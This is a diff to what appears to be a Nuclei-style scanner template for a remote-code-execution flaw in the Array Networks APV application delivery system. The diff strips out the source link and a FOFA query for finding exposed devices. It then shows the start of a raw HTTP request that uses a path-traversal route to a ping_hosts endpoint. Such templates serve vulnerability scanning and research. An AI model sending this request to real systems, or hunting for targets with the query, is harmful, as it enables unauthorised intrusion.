@@ -3,12 +3,8 @@ info:
   name: Array Networks APV应用交付系统 RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/osp48gff7l4qp6m1'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: osp48gff7l4qp6m1
-    fofa: app="Array-APV"
 http:
 - raw:
   - 'POST /restapi/../rest/ping_hosts HTTP/1.1
